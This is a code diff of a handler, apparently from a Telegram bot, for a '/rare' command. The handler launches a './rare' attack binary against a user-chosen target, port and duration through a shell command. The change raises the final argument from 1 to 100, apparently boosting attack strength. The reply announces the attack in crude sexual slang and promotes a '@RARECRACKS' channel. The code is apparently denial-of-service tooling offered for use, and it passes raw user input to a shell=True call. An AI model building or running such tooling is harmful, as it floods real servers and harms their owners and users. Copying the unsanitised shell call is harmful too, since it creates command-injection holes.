@@ -234,7 +234,7 @@ def handle_rare(message):
                     record_command_logs(user_id, '/rare', target, port, time_amount)
                     log_command(user_id, target, port, time_amount)
                     start_attack_reply(message, target, port, time_amount)
-                    full_command = f"./rare {target} {port} {time_amount} 1"
+                    full_command = f"./rare {target} {port} {time_amount} 100"
                     subprocess.run(full_command, shell=True)
                     response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐇𝐀𝐓𝐀𝐌🎮\n\n🎯𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🚪𝐏𝐎𝐑𝐓: {port}\n⏳𝐓𝐢𝐌𝐄: {time_amount} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐄𝐓𝐇𝐎𝐃: 𝐆𝐔𝐋𝐀𝐁𝐈𝐄 𝐏𝐔𝐒𝐒𝐘🥵\n𝐉𝐎𝐈𝐍 = @RARECRACKS 𝐎𝐓𝐇𝐄𝐑𝐖𝐈𝐒𝐄 𝐁𝐀𝐍 🤬🤬"
             except ValueError:
